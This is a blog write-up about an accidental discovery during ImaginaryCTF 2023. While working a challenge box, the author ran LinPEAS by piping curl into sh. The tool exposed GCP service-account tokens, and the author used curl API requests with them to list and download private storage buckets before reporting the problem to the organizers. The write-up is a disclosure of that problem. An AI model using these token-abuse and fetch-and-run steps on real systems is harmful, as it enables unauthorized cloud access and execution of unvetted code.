---
title: "How I (accidentally) hacked ImaginaryCTF infra"
date: 2023-07-23
description: "\"this is what i get for writing an instancer from scratch the day before the ctf\" - Eth007"
tags: [writeups, ctfs]
---

FYI: I wrote this writeup super quickly so expect a lot of typos :) (I'm too lazy to go through and fix them)

For this years ImaginaryCTF I played with my friends at `les amateurs`. We ended up placing 12th out of 880 teams competing! There were lots of super interesting challenges and I look forward to competing in next year.

# Background
Just for fun, I had decided to look at the challenge `misc/obscured`

{{< zoom-img src="img/chall.png" >}}

When we connect to the challenge it would have us complete a PoW that would then give us a box to SSH into. Once I realized I have no clue what I'm doing, I decided to run a powerful Linux enumartion script (very skid), LinPEAS ([github](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)). This tool does a multitude of checks specifically looking for ways to escalate privileges. Since this box had access to the internet, we could easily run the command to download and run the script.

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Running this script revealing some interesting information. Obviously it did reveal some information about the intended challenge (polkit) but what caught my eye the most was that the script detected this was running in Google Cloud. Once the script learned that, it did some extra enumeration to look for information related to GCP. It was able to find things like the project ID, project SSH keys, and lots more. The most interesting out of all of that was the access tokens for GCP service accounts.

{{< zoom-img src="img/service-accounts.png">}}

# GCP Enumeration

At first I was unsure if we could use this for anything, but after a bit of research I realized we can use the access tokens to make API requests about the GCP project. And looking at the scopes we had access to, I decided to look at the GCP storage to see if this is something worth reporting.

Using the [GCP Storage JSON API documentation](https://cloud.google.com/storage/docs/json_api/v1) as a reference, I crafted the following request to list the available buckets.

```bash
curl \
  'https://storage.googleapis.com/storage/v1/b?project=[REDACTED]' \
  --header 'Authorization: Bearer ya29.c.[REDACTED]' \
  --header 'Accept: application/json' \
  --compressed
```

Running this command revealed two buckets. To list the contents of the buckets, we could make the following cURL request.

```bash
curl \
  'https://storage.googleapis.com/storage/v1/b/[BUCKET ID]/o' \
  --header 'Authorization: Bearer ya29.c.[REDACTED]' \
  --header 'Accept: application/json' \
  --compressed
```

One of them would end up being empty, however the other bucket would contain some pretty sensitive information. Each one of the object IDs looked something like this

`[REDACTED URL]/containers/images/sha256:[sha256 hash]/[some num]`

Noticing this I assumed this bucket contained all of the docker containers used for ImaginaryCTF. To double check, I tried downloading one of the files. Not exactly sure what the file was since it didn't look like a docker image, however it **did** contain a flag. 

# Conclusion
Once we found this, I immediately dm'd one of the organizers telling him what I found and gave all the information he asked for. We ended up not using the flag we found (since you shouldn't do that) and the challenge went down for maintenance to get fixed.

Thank you to Eth007 for handling the situation very well and not DQ'ing our team for this! Once again, this was an amazing CTF and I had high hopes that next year this problem won't happen again!

# Funny Screenshot
{{< zoom-img src="img/funny.png" >}}
{{< zoom-img src="img/eth-dumb.png" >}}
{{< zoom-img src="img/lmao.png" >}}
